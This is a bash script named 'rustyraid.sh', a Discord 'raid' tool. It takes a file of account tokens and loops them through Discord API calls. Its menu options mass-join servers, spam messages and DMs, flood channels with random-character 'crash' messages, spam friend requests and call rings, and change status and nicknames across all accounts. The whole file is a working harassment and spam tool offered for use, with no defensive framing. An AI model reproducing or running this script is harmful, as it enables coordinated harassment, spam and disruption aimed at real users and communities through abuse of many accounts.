#!/bin/bash
lgreen='\033[0;32m'
lred='\033[0;31m'
nc='\033[0m'

count=0


if [[ $# == "" ]]; then
	echo -e $lred"you need to add a file with tokens in"
	echo -e $lgreen"sudo ./rustyraid.sh tokens.txt"
	exit 0
fi
function checkroot()
{
	if [[ $(id -u) != "0" ]]; then
		echo -e $lred"You need to run this script as root"
		echo "as some of the programs it uses might require root accses"
		echo -e $lgreen"Run the script as sudo ./rustyraid.sh tokens.txt"
	fi
}

while :
do

	clear
	echo -e $lreen"Welcone:" $lred"$USER"
	echo -e $lgreen""
	echo "1) Server commands"
	echo ""
	echo "2) Friend commands"
	echo ""
	echo "3) DM commands"
	echo ""
	echo "4) Account Changes"
	echo ""
	read -p "-->> " menu1
	if [[ $menu1 == "1" ]]; then
		clear
		echo "Server commands"
		echo ""
		echo "1) Join Server"
		echo ""
		echo "2) Leave Server"
		echo ""
		echo "3) Spam Message Server"
		echo ""
		echo "4) Crash Server (ASCII)"
		echo ""
		read -p "-->> " servermenu
		if [[ $servermenu == "1" ]]; then
			echo "Join Server"
			echo "Enter server regex"
			read -p "-->> " regex
			for token in `cat $1`; do
				printf "Token Used: $token Result: "
				RESULT=`curl "https://discord.com/api/v6/invites/$regex" -X "POST" --http2 -H "authorization: $token"`
				if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
					printf "fail\n"
				else
					printf "succsess\n"
				fi
			done
		fi
		if [[ $servermenu == "2" ]]; then
			echo "Leave Server"
			echo "Enter server ID"
			read -p "-->> " guildid
			for token in `cat $1`; do
				printf "Token Used: $token Result: "
				RESULT=`curl "https://discord.com/api/v6/users/@me/guilds/$guildid" -X "DELETE" --http2 -H "authorization: $token"`
				if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
					printf "fail\n"
				else
					printf "succsess\n"
				fi
			done
		fi
		if [[ $servermenu == "3" ]]; then
			echo "Spam Server"
			echo "Enter message"
			read -p "-->> " message
			echo "Enter the channelid"
			read -p "-->> " channelid
			echo "Enter loop"
			read -p "-->> " loop
			while [[ $count != $loop ]]; do
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					RESULT=`curl "https://discord.com/api/v6/channels/$channelid/messages" -X POST --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"content":"'"$message"'","nonce":"","tts":false}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
				let count=$count+1
			done
		fi
		if [[ $servermenu == "4" ]]; then
			echo "Crash Server (ASCII)"
			echo "Enter the channelid"
			read -p "-->> " channelid
			echo "Enter loop"
			read -p "-->> " loop
			while [[ $count != $loop ]]; do
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					randomascii=$(head -c 6200 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 3400 | head -n 1)
					RESULT=`curl "https://discord.com/api/v6/channels/$channelid/messages" -X POST -H "authorization: $token" -H "content-type: application/json" -d '{"content":"'"$randomascii"'","nonce":"","tts":false}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
				let count=$count+1
			done
		fi
	fi
	if [[ $menu1 == "2" ]]; then
		clear
		echo "Friend commands"
		echo ""
		echo "1) Spam Friend req"
		echo ""
		echo "2) Remove Friend req"
		echo ""
		read -p "-->> " friendmenu
		if [[ $friendmenu == "1" ]]; then
			echo "Spam FREQ"
			echo "Enter their user ID"
			read -p "-->> " userid
			for token in `cat $1`; do
				printf "Token Used: $token Result: "
				RESULT=`curl "https://discord.com/api/v6/users/@me/relationships/$userid" -X "PUT" --http2 -H "authorization: $token" -H "content-type: application/json"`
				if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
					printf "fail\n"
				else
					printf "succsess\n"
				fi
			done
		fi
		if [[ $friendmenu == "2" ]]; then
			echo "Remove FREQ"
			echo "Enter user ID"
			read -p "-->> " userid
			for token in `cat $1`; do
				printf "Token Used: $token Result: "
				RESULT=`curl "https://discord.com/api/v6/users/@me/relationships/$userid" -X "DELETE" --http2 -H "authorization: $token" -H "Content-Type: application/json"`
				if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
					printf "fail\n"
				else
					printf "succsess\n"
				fi
			done
		fi
	fi
	if [[ $menu1 == "3" ]]; then
		clear
		echo "DM commands"
		echo ""
		echo "1) Spam DM"
		echo ""
		echo "2) Crash DM (ASCII)"
		echo ""
		echo "3) Ring Spam"
		echo ""
		read -p "-->> " dmmenu
		if [[ $dmmenu == "1" ]]; then
			echo "Spam DM"
			echo "Enter message"
			read -p "-->> " message
			echo "Enter chat guild"
			read -p "-->> " channelid
			echo "Enter loop"
			read -p "-->> " loop
			while [[ $count != $loop ]]; do
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					RESULT=`curl "https://discord.com/api/v6/channels/$channelid/messages" --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"content":"'"$message"'","nonce":"","tts":false}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
				let count=$count+1
			done
		fi
		if [[ $dmmenu == "2" ]]; then
			echo "Crash DM "
		fi
		if [[ $dmmenu == "3" ]]; then
			echo "Ring Spam"
			echo "Enter channel ID"
			read -p "-->> " channelid
			for token in `cat $1`; do
				printf "Token Used: $token Result: "
				RESULT=`curl "https://discord.com/api/v6/channels/$channelid/call/ring" --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"recipients":null}'`
				if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
					printf "fail\n"
				else
					printf "succsess\n"
				fi
			done
		fi
	fi
	if [[ $menu1 == "4" ]]; then
		echo "Account changes"
		echo ""
		echo "1) Change online status"
		echo ""
		echo "2) Change name"
		echo ""
		read -p "-->> " accountmenu
		if [[ $accountmenu == "1" ]]; then
			echo "Change online status"
			echo ""
			echo "1) Online"
			echo ""
			echo "2) Idle"
			echo ""
			echo "3) DND"
			echo ""
			echo "4) Inv"
			echo ""
			read -p "-->> " onlinestatus
			if [[ $onlinestatus == "1" ]]; then
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					RESULT=`curl "https://discord.com/api/v6/users/@me/settings" --http2 -X PATCH --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"status":"online"}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
			fi
			if [[ $onlinestatus == "2" ]]; then
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					RESULT=`curl "https://discord.com/api/v6/users/@me/settings" --http2 -X PATCH --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"status":"idle"}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
			fi
			if [[ $onlinestatus == "3" ]]; then
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					RESULT=`curl "https://discord.com/api/v6/users/@me/settings" --http2 -X PATCH --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"status":"dnd"}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
			fi
			if [[ $onlinestatus == "4" ]]; then
				for token in `cat $1`; do
					printf "Token Used: $token Result: "
					RESULT=`curl "https://discord.com/api/v6/users/@me/settings" --http2 -X PATCH --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"status":"invisible"}'`
					if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
						printf "fail\n"
					else
						printf "succsess\n"
					fi
				done
			fi
		fi
		if [[ $accountmenu == "2" ]]; then
			echo "Change nickname"
			echo "Enter nickname"
			read -p "-->> " nickname
			echo "Enter Guildid"
			read -p "-->> " guildid
			#curl -s "https://discord.com/api/v6/guilds/$sguild/members/@me/nick" -X "PATCH" --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"nick":"'"$nickname"'"}'
			for token in `cat $1`; do
				printf "Token Used: $token Result: "
				RESULT=`curl "https://discord.com/api/v6/guilds/$guildid/members/@me/nick" --http2 -X "PATCH" --http2 -H "authorization: $token" -H "content-type: application/json" -d '{"nick":"'"$nickname"'"}'`
				if [[ $(echo $RESULT | head -1) =~ "<html>" ]]; then
					printf "fail\n"
				else
					printf "success\n"
				fi
			done
		fi
	fi
	echo -e $lred"Done :)"
	sleep 2

done
